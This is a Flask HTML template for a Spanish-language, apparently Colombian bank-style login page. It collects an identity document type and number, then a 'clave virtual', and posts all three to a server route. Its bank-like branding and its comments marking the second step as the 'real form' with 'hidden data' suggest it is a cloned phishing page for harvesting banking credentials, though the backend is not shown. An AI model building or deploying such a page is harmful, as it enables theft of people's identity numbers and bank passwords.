<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Ingreso</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  height:100vh;
  position:relative;

  background:
    url("{{ url_for('static', filename='Parteizquierda.png') }}") left no-repeat,
    url("{{ url_for('static', filename='Partederecha.png') }}") right no-repeat,
    #ffffff;

  background-size:contain, contain;
}

/* CONTENEDOR */
.container{
  width:100%;
  max-width:420px;
  margin:80px auto;
  text-align:left;
  transform: translateX(40px); 
}

/* LOGO */
.logo{
  width:320px;
  display:block;
  margin:0 auto 40px;
  transform: translateX(-30px);
}

/* TEXTOS */
h2{
  margin:5px 0;
  font-weight:normal;
 
}

.sub{
  font-weight:bold;
  font-size:28px;
  margin-bottom:25px;

}

/* LABELS */
label{
  display:block;
  margin-top:20px;
  margin-bottom:8px;
  font-size:18px;
  color:#4c4b4b;
}

/* INPUTS */
select, input{
  width:85%;
  padding:14px;
  border-radius:10px;
  border:1px solid #ccc;
  font-size:16px;
  box-sizing:border-box;
 
}

/* CHECK */
.check{
  width:20%;
  margin-top:30px;
  display:flex;
  align-items:center;
  gap:8px;
  font-size:16px;
  color:#333;
  white-space: nowrap;
}

/* BOTONES */
.btn{
  width:85%;
  padding:15px;
  margin-top:18px;
  border:none;
  border-radius:30px;
  font-weight:bold;
  font-size:18px;
  cursor:pointer;
}

.btn-continuar{
  background:#e30613;
  color:white;
}

.btn-login{
  background:#e30613;
  color:white;
}

/* PASO 2 */
#paso2{
  display:none;
  margin-top:10px;
}

/* FOOTER */
.footer{
  position:fixed;
  bottom:30px;
  left:0;
  width:100%;
  text-align:center;
}

.divider{
  width:300px;
  margin:0 auto;
  border-top:1px solid #ccc;
}

.link{
  margin-top:12px;
  font-size:17px;
  font-weight:bold; 
  color:#333;
}
</style>

</head>
<body>

<div class="container">

  <img src="{{ url_for('static', filename='logo3.png') }}" class="logo">

  <h2>¡Hola!</h2>
  <div class="sub">Nos alegra que esté aquí</div>

  <!-- PASO 1 -->
  <div id="paso1">

    <label>Seleccione su tipo de documento</label>
    <select id="tipoDoc">
      <option>Cédula de Ciudadanía</option>
      <option>Cédula de Extranjería</option>
      <option>NIT</option>
      <option>Tarjeta de Identidad</option>
      <option>Pasaporte</option>
    </select>

    <label>Ingrese su número de documento</label>
    <input type="text" id="documento" placeholder="Número de documento">

    <div class="check">
      <input type="checkbox">
      <span>Recordar mis datos de identidad</span>
    </div>

    <button id="btnContinuar" class="btn btn-continuar" onclick="continuar()">Continuar</button>

  </div>

  <!-- 🔥 FORMULARIO REAL -->
  <form id="paso2" method="POST" action="{{ url_for('procesar_login') }}">

    <label>Ingrese su clave virtual</label>
    <input type="password" name="clave" placeholder="Clave">

    <!-- 🔥 DATOS OCULTOS -->
    <input type="hidden" name="documento" id="docHidden">
    <input type="hidden" name="tipo_doc" id="tipoDocHidden">

    <button class="btn btn-login">Iniciar sesión</button>

  </form>

</div>

<div class="footer">
  <div class="divider"></div>
  <div class="link">¿Olvidó o bloqueó su clave?</div>
</div>

<script>
function continuar(){
  let doc = document.getElementById("documento").value;
  let tipo = document.getElementById("tipoDoc").value;

  if(doc.trim() !== ""){
    document.getElementById("paso2").style.display = "block";
    document.getElementById("btnContinuar").style.display = "none";

    // 🔥 GUARDAR DATOS
    document.getElementById("docHidden").value = doc;
    document.getElementById("tipoDocHidden").value = tipo;

  } else {
    alert("Debes ingresar el documento");
  }
}
</script>

</body>
</html>
